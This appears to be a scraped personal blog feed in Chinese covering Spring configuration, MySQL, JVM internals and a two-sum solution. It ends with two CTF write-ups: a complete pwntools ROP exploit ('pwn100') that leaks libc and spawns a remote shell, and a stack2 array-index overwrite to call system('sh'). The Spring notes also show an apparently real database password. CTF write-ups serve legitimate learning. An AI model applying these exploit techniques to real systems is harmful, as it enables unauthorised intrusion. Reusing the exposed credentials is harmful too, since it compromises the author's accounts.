name=\"attr\"&gt; &lt;list&gt; &lt;value&gt;zs&lt;/value&gt; &lt;value&gt;ls&lt;/value&gt; &lt;value&gt;ww&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; List的bean中配置 1234567&lt;!--list--&gt; &lt;property name=\"myList\"&gt; &lt;list&gt; &lt;value&gt;123&lt;/value&gt; &lt;value&gt;456&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; Map的bean中配置 12345678&lt;!--map--&gt; &lt;property name=\"myMap\"&gt; &lt;map&gt; &lt;entry key=\"ke1\" value=\"value1\"&gt;&lt;/entry&gt; &lt;entry key=\"ke2\" value=\"value2\"&gt;&lt;/entry&gt; &lt;entry key=\"ke3\" value=\"value3\"&gt;&lt;/entry&gt; &lt;/map&gt; &lt;/property&gt; Set的bean中配置 1234567&lt;!--set--&gt; &lt;property name=\"mySet\"&gt; &lt;set&gt; &lt;value&gt;000&lt;/value&gt; &lt;value&gt;111&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; IOC注解方式 在spring4之后，想要使用注解形式，必须得要引入aop的包 在配置文件当中，还得要引入一个context约束 配置组件扫描，指定在哪个包下扫描 1&lt;context:component-scan base-package=\"com.cauc\"/&gt; 在类的开头添加注解，表示将这个类交给Spring来管理 12345@Component(\"dog\")public class Dog &#123; @Value(\"WC\") public String name;&#125; 如果提供了set方法，在set方法上添加@value(“值”); 12345@Component(\"dog\")public class Dog &#123; @Value(\"WC\") public String name;&#125; IOC注解详解 @Component：修改一个类，将这个类交给Spring管理 相当于在配置文件当中配置 @Component三个衍生注解：为了更好的进行分层，Spring可以使用其它三个注解，功能类似，目前使用哪一个功能都一样， 后期可能会添加一些属于各自的属性 @Controller：web层 @Service：service层 @Repository：dao层 属性注入： 1234567891011121314151617181920212223//IOC@Component(\"user\")//单例/实例@Scope(\"prototype\")public class User &#123; //变量注入 @Value(\"潘星波\") public String name;// @Autowired/*根据类型注入*/// @Qualifier(\"dog\")/*根据名称注入*/ @Resource(name=\"dog\") public Dog dog; //初始化执行 @PostConstruct public void init()&#123; System.out.println(\"init---初始化\"); &#125; //销毁执行 @PreDestroy public void destroy()&#123; System.out.println(\"destroy---销毁\"); &#125;&#125; XML与注解比较 XML可以适用任何场景 ，结构清晰，维护方便 注解不是自己提供的类使用不了，开发简单方便 XML与注解整合开发 XML管理Bean 注解完成属性注入 使用过程中， 可以不用扫描，扫描是为了类上的注解 在没有扫描的情况下， 使用属性注解@Resource @Value @Autowired @Qulifier AOP AOP简介： 在软件业，AOP为Aspect Oriented Programming的缩写，意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。和python的装饰器有相似之处。 JDK动态代理（有接口的情况下） 当我们想给类增加或者删除功能，可以使用动态代理的方式，这样可以不用频繁的改动代码。类似python的装饰器 定义一个接口 1234public interface GoodsDao &#123; public void save(); public void update();&#125; 定义接口的实现类 1234567891011public class GoodsDaoImpl implements GoodsDao &#123; @Override public void save() &#123; System.out.println(\"保存操作\"); &#125; @Override public void update() &#123; System.out.println(\"更新\"); &#125;&#125; 定义测试类 1234567public class GoodsDaoTest &#123; @Test public void test()&#123; GoodsDao goodsDao = new GoodsDaoImpl(); goodsDao.save(); &#125;&#125; 假如此时需要修改功能，比如增加校验功能，我们需要修改许多代码，这时我们使用面向AOP编程，即使用JDK动态代理，使用步骤如下 定义一个代理类 其中方法接收一个代理的对象，并返回经过功能强化后的对象 1234567891011121314151617public class GoodsJDKProxy &#123; //接收待强化功能的对象 public GoodsDao createProxy(GoodsDao goodsDao)&#123; //增强 GoodsDao goodsDaoProxy = (GoodsDao) Proxy.newProxyInstance(goodsDao.getClass().getClassLoader(), goodsDao.getClass().getInterfaces(), new InvocationHandler() &#123; @Override/*当调用对象的时候，所有的方法都会来到这里*/ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (\"save\".equals(method.getName()))&#123; System.out.println(\"权限校验\"); &#125; return method.invoke(goodsDao,args); &#125; &#125;); return goodsDaoProxy; &#125;&#125; Proxy.newProxyInstance方法: 第一个参数：通过获取对象字节码的方式，加载对象 第二个参数：获取对象的接口 第三个参数：一个回调函数，对每个该对象的方法被调用的时候都为来到这里是增强功能的关键 测试 123456789101112public class GoodsDaoTest &#123; @Test public void test()&#123; GoodsDao goodsDao = new GoodsDaoImpl(); //创建自定义的代理类 GoodsJDKProxy goodsJDKProxy = new GoodsJDKProxy(); //获取的代理对象 GoodsDao proxy = goodsJDKProxy.createProxy(goodsDao); proxy.save(); proxy.update(); &#125;&#125; SpringJDBC-Template JDBC连接数据 1234567891011121314151617181920//jdbc连接数据库 public class SpringJdbcTest &#123; @Test public void test()&#123; //创建连接池（数据库相关信息） DriverManagerDataSource dataSource = new DriverManagerDataSource(); //使用哪种连接池，提供对应的驱动 dataSource.setDriverClass(\"com.mysql.jdbc.Driver\"); //数据库路径 dataSource.setJdbcUrl(\"jdbc:mysql:///spring?useUnicode=true&amp;characterEncoding=utf8\"); //用户名和密码 dataSource.setUser(\"root\"); dataSource.setPassword(\"pxb19990108\"); //创建jdbc的模板 JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource); //数据库操作 jdbcTemplate.update(\"insert into account values (null,?,?)\",\"pxb\",1000); &#125; &#125; Spring模板连接数据库 文件配置及注入 12345678910&lt;bean id=\"datasource\" class=\"com.mchange.v2.c3p0.DriverManagerDataSource\"&gt; &lt;property name=\"driverClass\" value=\"com.mysql.jdbc.Driver\"/&gt; &lt;property name=\"jdbcUrl\" value=\"jdbc:mysql:///spring?useUnicode=true&amp;amp;characterEncoding=utf8\"/&gt; &lt;property name=\"password\" value=\"****\"/&gt; &lt;property name=\"user\" value=\"root\"/&gt;&lt;/bean&gt; &lt;bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\"&gt; &lt;property name=\"dataSource\" ref=\"datasource\"/&gt; &lt;/bean&gt; 2. 代码 123456789101112//使用JDBC改写模板@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(\"classpath:applicationContext.xml\")public class SpringJdbc2 &#123; @Resource(name = \"jdbcTemplate\") private JdbcTemplate jdbcTemplate; @Test public void test()&#123; jdbcTemplate.update(\"insert into account values (null,?,?)\",\"pxb2\",1000); &#125;&#125; 使用第三方连接池，只需要引入对应的jar包，更改对应的属性名称即可——dbcp连接池 1234567&lt;!--dbcp连接池--&gt; &lt;bean id=\"dbcp\" class=\"org.apache.commons.dbcp.BasicDataSource\"&gt; &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"/&gt; &lt;property name=\"url\" value=\"jdbc:mysql:///spring?useUnicode=true&amp;amp;characterEncoding=utf8\"/&gt; &lt;property name=\"password\" value=\"pxb19990108\"/&gt; &lt;property name=\"username\" value=\"root\"/&gt; &lt;/bean&gt; 通过配置文件+bean完成连接池的创建 jdbc.properties 1234driverClassName = com.mysql.jdbc.Driverurl = jdbc:mysql:///spring?useUnicode=true&amp;characterEncoding=utf8password = pxb19990108username = root 1234567&lt;!--druid连接池--&gt; &lt;bean id=\"druid\" class=\"com.alibaba.druid.pool.DruidDataSource\"&gt; &lt;property name=\"driverClassName\" value=\"$&#123;driverClassName&#125;\"/&gt; &lt;property name=\"url\" value=\"$&#123;url&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;password&#125;\"/&gt; &lt;property name=\"username\" value=\"$&#123;username&#125;\"/&gt; &lt;/bean&gt; 通过配置文件+context标签完成连接池的创建 1&lt;context:property-placeholder location=\"classpath:jdbc.properties\"/&gt; 1234567&lt;!--druid连接池--&gt; &lt;bean id=\"druid\" class=\"com.alibaba.druid.pool.DruidDataSource\"&gt; &lt;property name=\"driverClassName\" value=\"$&#123;jdbc.driverClassName&#125;\"/&gt; &lt;property name=\"url\" value=\"$&#123;jdbc.url&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;jdbc.password&#125;\"/&gt; &lt;property name=\"username\" value=\"$&#123;jdbc.username&#125;\"/&gt; &lt;/bean&gt; 问题：通过配置文件加载后更新操作为何一直卡住没反应 CURD操作 插入 123456@Test public void insert()&#123; System.out.println(\"运行到1\"); jdbcTemplate.update(\"insert into account values (null,?,?)\",\"pxb5\",1000); System.out.println(\"运行到2\"); &#125; 1. 删除 123456@Test public void delete()&#123; System.out.println(\"运行到1\"); jdbcTemplate.update(\"delete from account where id = ?\",2); System.out.println(\"运行到2\"); &#125; 3. 查找 123456@Test public void select()&#123; System.out.println(\"运行到1\"); String name = jdbcTemplate.queryForObject(\"selec name from account where id = ?\",String.class,1); System.out.println(name); &#125; 4. 查询对象 123456@Test public void queryAccount()&#123; //查询单个对象 Account account = jdbcTemplate.queryForObject(\"select * from account where id =?\",new MyRowMap(),1); System.out.println(); &#125; 1234567891011class MyRowMap implements RowMapper&lt;Account&gt;&#123; @Override public Account mapRow(ResultSet resultSet, int i) throws SQLException &#123; Account account = new Account(); account.setId(resultSet.getInt(\"id\")); account.setName(resultSet.getString(\"name\")); account.setMoney(resultSet.getDouble(\"money\")); return account; &#125;&#125; * 编程式事务","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"SSH","slug":"SSH","permalink":"http://yoursite.com/tags/SSH/"}]},{"title":"mysql-base","date":"2019-09-05T03:36:21.000Z","path":"2019/09/05/mysql-base/","text":"关系型数据库是以表的形式存储数据，非关系型数据库是以键值对的形式存储数据 Mysql端口号3306 事务什么是事务 不可分割的操作,假设该操作有ABCD四个步骤组成. 若ABCD四个步骤都成功完成,则认为事务成功. 若ABCD中任意一个步骤操作失败,则认为事务失败 每条sql语句都是一个事务 事务只对DML语句有效,对于DQL无效 事务的ACID 原子性 原子性是指事务包含的所有操作要么全部成功，要么全部失败回滚 一致性 一致性是指事务必须使数据库从一个一致性状态变换到另一个一致性状态，也就是说一个事务执行之前和执行之后都必须处于一致性状态。 让数据保持一定上的合理 一个商品出库时，仓库商品数量减1，对应用户的购物车中商品加1 隔离性 隔离性是当多个用户并发访问数据库时，比如操作同一张表时，数据库为每一个用户开启的事务，不能被其他事务的操作所干扰，多个并发事务之间要相互隔离。 持久性 持久性是指一个事务一旦被提交了，就不能再回滚了，已经把数据保存到数据库当中了。 事务的使用 开启事务（start transaction） 提交事务（commit） 所有语句全部执行完毕，没有发生异常,提交事务，更新到数据库当中。 回滚事务（rollback） 当遇到一突发情况，撤销执行的sql语句 事务的并发问题 脏读 访问到了还没有提交的事务所产生的结果 解决办法：Read committed！读提交，能解决脏读问题 不可重复读 一个事务范围内两个相同的查询却返回了不同数据，这就是不可重复读 解决办法：Repeatable read 重复读：当事务开启时，不允许其他的事务的UPDATA修改操作 幻读：事务开启的时候读到一个结果，事务提交又读到一个结果，两者不一样 对应关系： 事务隔离级别 脏读 不可重复读 幻读 读未提交 是 是 是 不可重复读 否 是 是 可重复读 否 否 是 串行化 否 否 否 事务隔离级别 Read uncommitted：就是一个事务可以读取另一个未提交事务的数据 Read committed：一个事务要等另一个事务提交后才能读取数据 Repeatable read：就是在开始读取数据（事务开启）时，不再允许修改操作 Serializable ：在该级别下，事务串行化顺序执行，可以避免脏读、不可重复读与幻读 查看隔离级别 select @@global.tx_isolation,@@tx_isolation; 设置隔离级别 全局的： set global transaction isolation level read committed; 当前会话： set session transaction isolation level read committed; Mysql性能优化 数据访问 只返回必要的列，尽量避免使用select * 只返回必要的行，用limit语句来限制返回的行数 使用缓存，让经常查询的数据放入缓存中 使用索引 重构查询 切分大的查询：一个大查询一次锁住很多数据，阻塞小且重要的数据 切分前 1delete from table where create &lt; data_sub(now(),interval 3 month); 切分后 1234rows_affected = 0do&#123; rows_affect = do_query(\"delete from table where create &lt; data_sub(now(),interval 3 month)\")&#125; while rows_affected &gt; 0 分解大连接查询 大连接查询分解成对每一个表进行一次单表查询，然后再应用程序进行关联 这样可以让缓存更加高效，假如连接了多个表，当一个表的缓存失效了，整个表的缓存也会失效 单表的缓存结果可以被其他表用到，减少冗余 减少锁的竞争 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。 查询本身效率也可能会有所提升。 索引 什么是索引：以表中的一列或者多列，按照某种方式组织起来的数据结构，达到加速查找的目的 索引的分类： 根据索引实际的应用分为：普通索引、主键索引、唯一索引、全文索引（可以用于查找文本中的关键词）、联合索引 根据实现的数据结构分为： B树索引：类似二叉搜索树，一个m阶的B树，其子节点最多有m-1个节点，左子树的值都比父节点小，右子树的值都比父节点大，同时子节点的数值大小依次递增。 B+树索引：在B树的基础上，对同一层的节点新增指针的顺序访问 Hash索引：能以O(1)时间进行查找，但无法用于排序和分组，只支持精确查找，无法用于部分查找和范围查找 空间数据索引：基于R-tree的空间数据索引，可以用于地理数据的存储。空间数据索引会从所有的纬度来索引数据，可以有效的使用任意纬度来进行组合查询。缺点是必须使用GIS相关的函数来维护数据。 根据数据域存储的内容分为： 主索引：叶子节点的data域记录着完整的数据记录，也称聚簇索引 辅助索引：叶子节点的data域记录着主键的值，在查找的时候，先找到主键的值，然后再到主索引中进行查找。 索引优化 索引不能成为表达式的一部分，不能是函数的参数，否则无法使用索引 再需要使用多个列作为条件进行查询的时候，使用多列索引比使用单个列索引性能更好。 将选择性最强的索引放在前面，索引的选择性是指不重复的索引值和记录总数的比值，最大为1 对于Text和Varchar类型的列，必须使用前缀索引，只索引开始的部分字符，对于前缀长度的选取需要根据索引选择性来确定 索引包含所有需要查询的字段的值 切分 水平切分：当一个表的数据不断增多的时候，水平切分可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。 策略：哈希取模hash(key)%N 范围：按照ID范围或者时间范围 问题：事务问题（使用分布式事务来解决，比如XA接口）、连接问题（可以将原来的连接分成多个单表查询，然后在用户户程序中进行连接） 垂直切分：将一张表按照列分成多个表，通常按照列的关系密集程度或者使用频率切分，比如经常用的列分一起，不常用的列分一起。 复制 主从复制 一个主服务器，一个从服务器 binlog线程：主服务器将数据更改写入二进制日志文件（binary log）中 I/O线程：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（relay log）中。 SQL线程：负责读取中继日志，解析出主服务器已经执行的数据并在服务器中执行 读写分离 主服务器处理写操作以及实时性较高的读操作，而从服务器处理读操作 优点： 主从服务器负责各自的读和写，极大程度上缓解了锁的竞争 从服务器可以使用MyISAM，提升查询的性能以及节约系统开销 增加冗余，提高可用性 实现方式： 通过代理的方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器","tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"basic","slug":"basic","permalink":"http://yoursite.com/tags/basic/"}]},{"title":"javaBasic","date":"2019-09-02T10:56:20.000Z","path":"2019/09/02/javaBasic/","text":"Java Package区别类名的命名空间，作用如下 把功能相似或相关的类或接口组织在同一个包中，方便类的查找和使用。 如同文件夹一样，包也采用了树形目录的存储方式。同一个包中的类名字是不同的，不同的包中的类的名字是可以相同的，当同时调用两个不同包中相同类名的类时，应该加上包名加以区别。因此，包可以避免名字冲突。 包也限定了访问权限，拥有包访问权限的类才能访问某个包中的类。Java 使用包（package）这种机制是为了防止命名冲突，访问控制，提供搜索和定位类（class）、接口、枚举（enumerations）和注释（annotation）等。 抽象方法抽象方法只有方法声明，没有方法主体 12345abstract class xy&#123; //错误 abstract sum (int x, int y) &#123; &#125;&#125; 接口接口中的属性在不提供修饰符修饰的情况下，会自动加上public static final 属性不能用private，protected,default 修饰，因为默认是public 如果属性是基本数据类型，需要赋初始值，若是引用类型，也需要初始化，因为默认有final修饰，必须赋初始值； 接口中常规的来说不能够定义方法体，所以无法通过get和set方法获取属性值，所以属性不属于对象，属于类（接口），因为默认使用static修饰。 Java.lang包 包装类 String 类 Math 类 —— 包含函数 Class 类 Object 类 线程销毁run()方法的执行结束，start()方法开启一个线程并执行run()方法，start()结束run()不一定结束。start()方法是让线程变成就绪态。 JVM JVM内存划分 方法区：存放已经加载的class信息和static变量、常量等信息，方法区中包含的都是在程序中唯一的元素 虚拟机栈：执行引擎每次调用一个函数时，就为这个函数创建一个栈帧并将他入栈。 本地方法区：与虚拟机栈作用相似，但它为native方法服务（native方法是Java调用非Java代码的接口） 堆：所有线程共享的区域，在虚拟机启动时创建，所有对象实例及数组都在堆上分配。 程序计数器：每个线程得有个计数器记录当前执行到哪个指令。 判断一个对象是否可回收： 引用计数法：为对象添加一个引用计数器，当对象增加一个引用+1，引用失效-1，为0时可以被回收（缺点是无法解决循环引用的问题） 可达性分析：以GC Roots为起点进行搜索，可达的对象都是存活的，不可达的对象可以被回收。 GC Roots可以是： 虚拟机栈中局部变量比啊中引用的对象 本地方法栈JNI中引用的对象 方法去中类静态属性引用的对象 方法区中常量引用的对象 方法区的回收：方法区主要存放永久代对象，而永久代对象的回收率比新生代低很多，所以在方法区上进行回收性价比不高，主要是对常量池的回收和对类的卸载。 finalize()：类似C++的析构函数，用于关闭外部资源。 Java的四种强度不同的引用类型 强引用：使用new一个新对象的方式创建 垃圾回收器绝不会回收它，当内存空间不足时，Java虚拟机宁愿抛出异常使程序终止也不会靠随意回收具有强引用的对象来解决内存不足的问题 1Object obj = new Object(); 软引用：被软引用关联的对象只有在内存不够的情况下才会被回收 使用 SoftReference 类来创建软引用。 123Object obj = new Object(); SoftReference&lt;Object&gt; sf = new SoftReference&lt;Object&gt;(obj); obj = null; // 使对象只被软引用关联 弱引用：被弱引用关联的对象一定会被回收，也就是说他只能存活到下一次垃圾回收发生之前。 使用 WeakReference 类来创建弱引用。 123Object obj = new Object(); WeakReference&lt;Object&gt; wf = new WeakReference&lt;Object&gt;(obj); obj = null; 虚引用： 又称为幽灵引用或者幻影引用，一个对象是否有虚引用的存在，不会对其生存时间造成影响，也无法通过虚引用得到 一个对象。为一个对象设置虚引用的唯一目的是能在这个对象被回收时收到一个系统通知。使用 PhantomReference 来创建虚引用。 垃圾回收算法 标记-清除 在标记阶段：程序会检查每个对象是否为活动对象，如果是活动对象，则程序会在对象头部打上标记。 在清除阶段：会进行对象回收并取消标志位，另外，还会判断回收后的分块与前一个空闲分块是否连续，若连续，会合并这两个分块。回收对象就是把对象作为分块，连接到被称为 “空闲链表” 的单向链表，之后进行分配时只需要遍历这个空闲链表，就可以找到分块。 不足： 标记和清除的效率都不高；会产生大量不连续的碎片，导致无法给大对象分配内存。 标记-整理 进行垃圾回收时，让所有存活的对象都向一端移动 复制 将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然 后再把使用过的内存空间进行一次清理。 不足：内存只使用了一半。 现代商业虚拟机中将新生代内存分为3块，一块比较大的Eden区，两块比较小的Survivor区，比例为8：1：1每次使用Eden区和其中一块Survivor区，在回收的时候将Eden和Survivor中的存活对象复制到另一块Survivor区上，然后清理Eden和使用过的那一块Survivor区，如果每次回收的对象过多导致另一块Survivor不够用，此时需要依赖老年代进行空间分配担保，也就是借用老年代的空间存储放不下的对象。 分代收集 根据对象存活周期将内存划分为几块，不同的块采用适当的回收算法。 为了更好得管理堆区域，一般将堆划分为新生代和老年代 新生代使用：复制算法 老年代使用：标记-清除、标记-整理算法 内存分代： 一个应用启动，操作系统会给他分配一个初始的内存大小，这部分内存大部分应该属于堆内存，JVM 为了更好地利用管理这部分内存，对该区域做了划分，一部分成为新生代，另一部分称为老年代。 Minor GC：随着对象不断地创建，如果新生代没有空间创建新对象，将会发生的GC。 Full GC：位于新生代的对象每经过一次Minor GC后，如果这个对象没有被回收，则自己的标记数+1，这个标记标记数用于表示这个对象经历了多少次的Minor GC，次数超过一定后，这个对象才会被移动到老年代，随着时间的推移，如果老年代也没有足够的空间容纳对象，老年代也会试着发生GC，这时候的GC叫做Full GC。 相比 Minor GC，Full GC 发生的次数比较少，但是每发生一次 Full GC，整个堆内存区域都需要执行一次垃圾回收，这对程序性能造成的影响比 Minor GC 大很多，所以我们应该尽量避免或者减少 Full GC 的发生。同时，在堆内存区域，发生最多的 GC 情形就是新生代的 Minor GC 了，因为所有的对象会优先去新生代开辟空间，所以这块的内存变化会很快，只有内存不够用，就会发生 GC，但是一般的 Minor GC执行比 Full GC 快很多。因为两者使用的算法不同。 内存分配策略 对象优先在Eden分配 大多数情况下，对象在新生代Eden上分配，当Eden空间不足时，发起Minor GC。 大对象直接进入老年代 大对象指的是需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组，经常出现大对象会提前触发垃圾收集器以获取足够的连续空间分配给大对象。 -XX：PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在Eden和Survivor之间的大量内存复制。 动态对象年龄判定 虚拟机并不是永远要求对象的年龄必须达到MaxTenuringThreshold才能晋升老年代，如果在Survivor中相同年龄所有对象大小的总和大于Survivor空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代。 空间分配担保 在发生Minor GC之前，虚拟机先检查老年代大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的 话，那么Minor GC可以确认是安全的。如果不成立的话虚拟机会查看HandlePromotionFailure的值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC如果小 于，或者HandlePromotionFailure的值不允许冒险，那么就要进行一次Full GC。 Full GC的触发条件 调用System.gc()： 只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。 老年代空间不足： 老年代空间不足的常见常见为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。 为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过调整虚拟机参数 -Xmn：虚拟机参数 调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。 -XX:MaxTenuringThreshold：调大对 象进入老年代的年龄，让对象在新生代多存活一段时间。 空间分配担保失败： 使用复制算法的Minor GC需要老年代的内存空间做担保，如果担保失败会执行一次Full GC。 JDK 1.7及以前的永久代空间不足 在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些Class的信息、常量、静 态变量等数据。当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用CMS GC的情况下也 会执行Full GC。如果经过Full GC仍然回收不了，那么虚拟机会抛出java.lang.OutOfMemoryError。 为避免以上原因引起的Full GC，可采用的方法为增大永久代空间或转为使用CMS GC。 Concurrent Mode Failure 执行CMS GC的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是GC过程中浮动垃圾过多导致暂时性的空间不足），便会报Concurrent Mode Failure错误，并触发 Full GC。 类加载机制 背景：类是在运行期间第一次使用的时候动态加载的，而不是一次性加载所有的类。因为如果一次性加载，那么会占用很多的内存。 类的生命周期： 加载： 通过类的完全限定名称获取定义该类的二进制字节流。 将该字节流表示的静态存储结构转换为方法区的运行时存储结构。 在内存中生成一个代表该类的Class对象，作为方法区中该类的各种数据的访问入口。 其中二进制字节流可以从以下方式获取： 从ZIP包中读取，成为JAR、EAR、WAR格式的基础。 从网络中获取，最典型的应用是 Applet。 运行时计算生成，例如动态代理技术，在 java.lang.reﬂect.Proxy 使用 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。 由其他文件生成，比如由JSP文件生成对应的Class类。 验证： 确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。 准备： 类变量是被static修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。实例变量不会在这阶段分配内存，它会在对象实例化时随着对象一起被分配在堆中。应该注意到，实例化不是类加载 的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。 初始值一般为 0 值，例如下面的类变量value被初始化为0而不是123。 1public static int value = 123; 如果类变量是常量，那么它将初始化为表达式所定义的值而不是 0。例如下面的常量 value 被初始化为 123 而不是 0。 1public static final int value = 123; 数组创建的步骤 声明变量 在堆中用new关键字初始化数组 把被初始化的数组的地址赋值给声明的变量 GC:垃圾回收机制程序员不需要再手动的控制内存的释放，当JVM发现内存资源紧张的时候，会自动的清理无用的对象，JVM的垃圾回收机制中，判断一个对象是否死亡，并不是根据是否还有对象对其有引用，而是通过可达性分析。对象之间的引用可以抽象成树形结构，通过树根（GC Root）作为起点，从这些树根向下搜索，搜索过的链称为引用链，当一个对象到GC Root没有任何引用链时，证明这个给对象是不可用的，该对象会被判定为可回收对象。 数据类型 基本数据类型：只存放在栈中 引用数据类型：堆中存放实体，栈中存放地址（new出来的都是引用数据类型）","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"language","slug":"language","permalink":"http://yoursite.com/tags/language/"}]},{"title":"algorithm1","date":"2019-09-02T10:21:20.000Z","path":"2019/09/02/algorithm1/","text":"两数之和 思路:使用一个HashMap，便利数组，每次将互补的数作为key，下标作为value存入HashMap中；并且查看nums[i]是否存在于HashMap中，若存在则获取下标，因为之存在一组结果，所以内外都要返回。 代码： 123456789101112131415class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; HashMap &lt;Integer,Integer&gt; tmpMap = new HashMap&lt;Integer,Integer&gt;(); int index[]=new int[2]; for(int i=0;i&lt;nums.length;i++)&#123; if(tmpMap.containsKey(nums[i]))&#123; index[0]=i; index[1]=tmpMap.get(nums[i]); return index; &#125; tmpMap.put(target - nums[i],i); &#125; return index; &#125;&#125; 时间复杂度: O(n)","tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://yoursite.com/tags/algorithm/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"pwn100","date":"2019-08-22T02:40:31.000Z","path":"2019/08/22/pwn100/","text":"溢出点:自己定义了一个read函数，是在原来的read上进行包装，读满200个字节才退出 1234567891011121314__int64 __fastcall my_read(__int64 a1, signed int a2)&#123; __int64 result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; result = (unsigned int)i; if ( i &gt;= a2 ) break; read(0, (void *)(i + a1), 1uLL); &#125; return result;&#125; 然而read读到的内容是放在调用函数这一层rbp-0x40h的地方，肯定会溢出 1234567int sub_40068E()&#123; char v1; // [rsp+0h] [rbp-40h] my_read((__int64)&amp;v1, 200); return puts(\"bye~\");&#125; 利用:123456[*] '/mnt/hgfs/linux_share/pwn/xctf/pwn100/pwn100' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 泄露libc版本，然后调用system(&#39;/bin.sh&#39;) exp:12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level='debug'# p = process('./pwn100')p=remote('111.198.29.45',45415)# gdb.attach(p,'b*0x00000000004006B6')elf = ELF('./pwn100')start_addr =0x00000000004006B8pop_rdi = 0x0000000000400763payload1 = (0x48*'a'+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(start_addr)).ljust(200,'a')p.send(payload1)p.recvuntil('bye~\\n')unpack = p.recvuntil('\\n',drop=True).ljust(0x8,'\\x00')put_addr = hex(u64(unpack))info('puts: '+ put_addr)payload2 = (0x48*'a'+p64(pop_rdi)+p64(elf.got['read'])+p64(elf.plt['puts'])+p64(start_addr)).ljust(200,'a')p.send(payload2)p.recvuntil('bye~\\n')unpack = p.recvuntil('\\n',drop=True).ljust(0x8,'\\x00')read_addr = hex(u64(unpack))info('read: '+ read_addr)obj = LibcSearcher(\"puts\", int(put_addr,16))obj.add_condition('read', int(read_addr,16))system = int(put_addr,16) + obj.dump(\"system\") - obj.dump('puts')bin_sh = int(put_addr,16) + obj.dump(\"str_bin_sh\") - obj.dump('puts')payload3 = (0x48*'a'+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(start_addr)).ljust(200,'a')p.sendline(payload3)p.interactive() 这个LibcSearcher的添加条件功能不太会用，不知道为啥加了条件出来的结果反而变多了，我就手动选了一个，竟然一次就对了- -，我选的3 1234567891011Multi Results: 0: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386) 1: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386) 2: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386) 3: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) 4: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) 5: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386) 6: archive-old-glibc (id libc6-i386_2.19-10ubuntu2.3_amd64)Please supply more info using add_condition(leaked_func, leaked_address).You can choose it by hand","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"overflow","slug":"overflow","permalink":"http://yoursite.com/tags/overflow/"}]},{"title":"stack2","date":"2019-08-21T00:29:12.000Z","path":"2019/08/21/stack2/","text":"程序逻辑:输入几个数，然后可以使用程序提供的4个功能进行操作，直到输入5程序才会退出。 1puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); 溢出点:12345puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; 更改数的功能，下标v5的范围没有限制，会导致数组越界，我们可以利用他来向栈上更高地址的位置写入数据，将返回地址改写使他跳转到开shell的函数处执行 1234int hackhere()&#123; return system(\"/bin/bash\");&#125; 这道题因为环境的问题远程服务器上没有/bin/bash的shell，可以用sh的shell，/bin/sh的地址是0x08048980，加7就是sh的地址 1.rodata:08048980 command db &apos;/bin/bash&apos;,0 ; DATA XREF: hackhere+14↑o 栈上布局:123456789low esp---&gt; +-----------------+ | call system | +-----------------+ | sh | +-----------------+ | | | | | |high +-----------------+ 关于返回地址的位置，我一开始也以为是直接与v13相隔0x70的位置后来调试发现不对，是相差了132的地方，还是要以程序运行时的调试结果为准。 